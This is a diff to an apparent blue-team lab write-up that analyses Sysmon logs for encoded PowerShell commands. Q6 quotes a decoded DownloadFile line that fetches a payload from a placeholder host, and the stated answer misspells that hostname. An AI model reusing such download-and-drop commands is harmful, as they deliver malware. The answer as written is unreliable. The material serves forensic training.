@@ -46,8 +46,9 @@ answer: `2027-01-19 09:41:26`
 Q5.  How many process creations in sysmon.log ran with -EncodedCommand?
    For that i needed more info, just ran a Wc for -EncodedCommand, got answer, `48`.
 <img width="935" height="36" alt="image" src="https://github.com/user-attachments/assets/37ab0f81-52d2-489e-89ca-3d995f1cafc5" />
+
 Q6. Which external host does the decoded command download from?
-It comes from the decoded command: "DownloadFile('http://cdn-updates.contoso-delivery.invalid/upd/pkg.bin', ...)." soo the answer it's `dn-updates.contoso-delivery.invalid`.
+It comes from the decoded command: `"DownloadFile('http://cdn-updates.contoso-delivery.invalid/upd/pkg.bin', ...`)." soo the answer it's `dn-updates.contoso-delivery.invalid`.
 
 Q7: File written to disk.
 This is the second argument to DownloadFile. It also matches the Sysmon EID 11 TargetFilename at 09:41:29 and the Wazuh 92100 alert. It is a world-writable folder with a name that mimics a system file, so it looks like masquerading.
